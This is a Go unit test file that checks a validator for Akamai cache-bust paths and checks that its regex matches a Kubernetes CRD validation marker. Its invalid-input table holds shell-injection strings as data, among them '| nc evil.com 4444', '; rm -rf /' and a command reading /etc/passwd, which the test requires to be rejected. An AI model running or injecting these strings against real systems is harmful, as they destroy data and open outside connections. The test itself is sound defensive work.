package utils

import (
	"os"
	"regexp"
	"testing"
)

func TestIsValidCacheBustPath(t *testing.T) {
	valid := []struct {
		name string
		path string
	}{
		{"simple relative path", "/apps/inventory/fed-mods.json"},
		{"full HTTPS URL", "https://console.redhat.com/apps/inventory/fed-mods.json"},
		{"full HTTP URL", "http://example.com/path"},
		{"path with query string", "/apps/foo?v=1&t=2"},
		{"path with fragment", "/apps/foo#section"},
		{"path with encoded chars", "/apps/foo%20bar"},
		{"path without leading slash", "apps/inventory/fed-mods.json"},
		{"URL with port", "https://example.com:8443/path"},
		{"matrix param with semicolon", "/apps/foo;jsessionid=1"},
	}

	for _, tc := range valid {
		t.Run("valid/"+tc.name, func(t *testing.T) {
			if !IsValidCacheBustPath(tc.path) {
				t.Errorf("expected %q to be valid", tc.path)
			}
		})
	}

	invalid := []struct {
		name string
		path string
	}{
		{"command substitution", "$(whoami)"},
		{"nested command substitution", "$(cat $(echo /etc/passwd))"},
		{"backtick substitution", "`whoami`"},
		{"pipe", "| nc evil.com 4444"},
		{"semicolon chain with spaces", "; rm -rf /"},
		{"newline injection", "/path\n; rm -rf /"},
		{"carriage return injection", "/path\r\n; rm -rf /"},
		{"tab injection", "/path\t; rm -rf /"},
		{"null byte", "/path\x00; rm -rf /"},
		{"backslash", "/path\\foo"},
		{"empty string", ""},
		{"space in path", "/path with spaces"},
		{"curly braces", "/path/{foo}"},
		{"angle brackets", "/path<script>"},
		{"double quotes", `/path"; echo pwned"`},
		{"single quotes", "/path'; echo pwned'"},
		{"dollar sign alone", "/path/$HOME"},
		{"ampersand with spaces", "/path & curl evil.com"},
	}

	for _, tc := range invalid {
		t.Run("invalid/"+tc.name, func(t *testing.T) {
			if IsValidCacheBustPath(tc.path) {
				t.Errorf("expected %q to be invalid", tc.path)
			}
		})
	}
}

// TestCacheBustPatternMatchesCRDMarker guards against drift between the runtime
// allowlist (CacheBustPathPattern) and the kubebuilder items:Pattern marker on
// FrontendSpec.AkamaiCacheBustPaths. If admission validation and runtime
// validation disagree, paths can be accepted by the API server then silently
// skipped at reconcile time (or vice versa).
func TestCacheBustPatternMatchesCRDMarker(t *testing.T) {
	const typesFile = "../../api/v1alpha1/frontend_types.go"

	src, err := os.ReadFile(typesFile)
	if err != nil {
		t.Fatalf("reading %s: %v", typesFile, err)
	}

	// Anchor to the AkamaiCacheBustPaths field on the line following the marker
	// so we don't accidentally match an items:Pattern on some other field.
	markerRe := regexp.MustCompile("(?m)^\\s*// \\+kubebuilder:validation:items:Pattern=`(.+)`\\s*\\n\\s*AkamaiCacheBustPaths\\b")
	m := markerRe.FindSubmatch(src)
	if m == nil {
		t.Fatalf("could not find items:Pattern marker for AkamaiCacheBustPaths in %s", typesFile)
	}

	if got := string(m[1]); got != CacheBustPathPattern {
		t.Errorf("CRD items:Pattern marker %q does not match utils.CacheBustPathPattern %q; keep them in sync", got, CacheBustPathPattern)
	}
}
